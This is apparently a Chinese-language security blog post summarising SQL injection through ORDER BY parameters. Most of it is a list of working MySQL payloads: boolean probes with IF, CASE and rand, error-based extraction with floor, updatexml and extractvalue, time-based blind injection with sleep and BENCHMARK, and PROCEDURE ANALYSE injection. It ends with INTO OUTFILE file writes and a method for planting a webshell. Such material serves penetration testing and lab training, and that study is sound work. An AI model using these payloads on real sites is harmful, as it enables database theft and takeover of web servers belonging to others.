---
layout: post
title:  "SQL注入之order by注入总结"
date:   2018-11-28 20:15:33 +0700
categories: [Web安全, SQL注入]
---

## 0x00 order by 注入是什么

order by 注入是指其后面的参数是可控的，例如：

```sql
select * from goods order by $_GET['id']
```

order by 不同于我们在where后的注入点，不能使用union等注入。

## 0x01 简单的注入判断

有时候，我们可以利用order by子句进行快速猜解表中的列数，再配合`union select`语句进行回显。

例如：

```sql
id = 1 order by 3 // 不报错
id = 1 order by 4 //报错
```

说明前面的字段数为3。

## 0x02 构造payload

**url:**

```url
http://vunl.com/?sort=1
```

我们可以直接构`？sort=`后面一个参数：

* 直接添加注入语句，`？sort=(sql语句)`
* 利用一些函数，rand函数，ifnull。 `？sort=rand(sql语句)`
* 利用 `and`，例如`?sort=1 and (sql语句)`

### 1、直接添加语句

```sql
/?sort=IF(1=1,name,price) 通过name字段排序
/?sort=IF(1=2,name,price) 通过price字段排序
```

```sql
/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序
```

```sql
/?order=IFNULL(NULL,price) 通过price字段排序
/?order=IFNULL(NULL,name) 通过name字段排序
```

rand(true) 和 rand(false)的结果是不一样的。

```
/?sort=rand(1=1)
/?sort=rand(1=2)
/?sort=rand(ascii(left(database(),1))=115)
```

### 2、利用报错

**floor函数**

```
sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
```

**返回多条记录**

```
/?sort=IF(1=1,1,(select+1+union+select+2)) 正确
/?sort=IF(1=2,1,(select+1+union+select+2)) 错误
/?sort=IF(1=1,1,(select+1+from+information_schema.tables)) 正常
/?sort=IF(1=2,1,(select+1+from+information_schema.tables)) 错误
```

**利用regexp**

```
/?order=(select+1+regexp+if(1=1,1,0x00)) 正常
/?order=(select+1+regexp+if(1=2,1,0x00)) 错误
```

**利用updatexml**

```
/?sort=updatexml(1,if(1=1,1,user()),1) 正确
/?sort=updatexml(1,if(1=2,1,user()),1) 错误
```

**利用extractvalue**

```
/?sort=extractvalue(1,if(1=1,1,user())) 正确
/?sort=extractvalue(1,if(1=2,1,user())) 错误
```

###3、利用延时

```
?sort= (select if(substr(current,1,1)=char(115),
BENCHMARK(50000000,md5('1')),null) from (select database() as curr
ent) as tb1)
```

```sql
?sort=if(ascii(substr(database(),1,1))=116,0,sleep(5))
```

### 4、procedure anaylse 参数后注入

利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。

```sql
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
```

### 5、导入导出文件 into outfile参数

```sql
?sort=1 into outfile "C:\phpStudy\PHPTutorial\WWW\sqli\Less-46\hack.txt"
```

可以利用`lines terminated by` 上传webshell

```sql
into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16进制转换)
```

